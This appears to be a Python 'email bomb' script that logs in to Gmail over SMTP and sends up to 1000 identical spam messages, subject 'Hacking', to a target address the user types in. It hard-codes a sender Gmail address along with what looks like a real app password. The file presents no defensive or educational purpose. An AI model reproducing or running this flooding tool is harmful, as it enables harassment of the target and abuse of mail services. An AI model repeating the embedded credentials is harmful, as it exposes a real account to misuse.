import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
class email_bomb():
    def __init__(self):
        self.count=0
    def detail(self):
        self.sender='lafirmufeeth@gmail.com'
        self.receiver=input("Enter Your Reciver Gmail: ").lower()+"@gmail.com"
        self.subject="Hacking"
        self.body="This is spam Message"
    def counter(self):
        self.counter=int(input("Enter Number for Number of Email bomb: (1000), (5), (1): "))
        li=[1000,5,1]
        if self.counter not in li:
            print("Enter Wrong choice")
        else:
            message=MIMEMultipart()
            message['From']=self.sender
            message['To']=self.receiver
            message['Subject']=self.subject
            message.attach(MIMEText(self.body,'plain'))
            for x in range(1,self.counter+1):
                try:
                    gmail=smtplib.SMTP_SSL('smtp.gmail.com',465)
                    gmail.login(self.sender,'qnvo hbim qmgl hxir')
                    gmail.sendmail(self.sender,self.receiver,message.as_string())
                    print("Send Successful")
                except Exception as f:
                    print(f'Error: {f}')
            gmail.quit()
gmail=email_bomb()
gmail.detail()
gmail.counter()
